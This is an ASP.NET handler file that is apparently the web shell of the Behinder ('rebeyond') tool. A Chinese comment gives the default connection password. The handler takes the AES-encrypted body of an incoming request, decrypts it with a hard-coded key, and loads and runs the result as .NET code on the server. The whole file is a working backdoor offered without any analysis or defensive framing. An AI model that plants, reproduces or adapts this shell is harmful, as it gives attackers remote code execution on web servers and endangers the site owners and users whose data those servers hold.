<% @ webhandler language="C#" class="NodeHandler" %> 

using System; 
using System.Web; 
using System.Text;
using System.Reflection;
public class NodeHandler : IHttpHandler,System.Web.SessionState.IRequiresSessionState
{ 
public bool IsReusable 
{ get { return true; } } 
public void ProcessRequest(HttpContext ctx) 
{ 
ctx.Session.Add("k","e45e329feb5d925b"); /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
byte[] k = Encoding.Default.GetBytes(ctx.Session[0] + ""),c = ctx.Request.BinaryRead(ctx.Request.ContentLength);
Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(ctx);
} 
}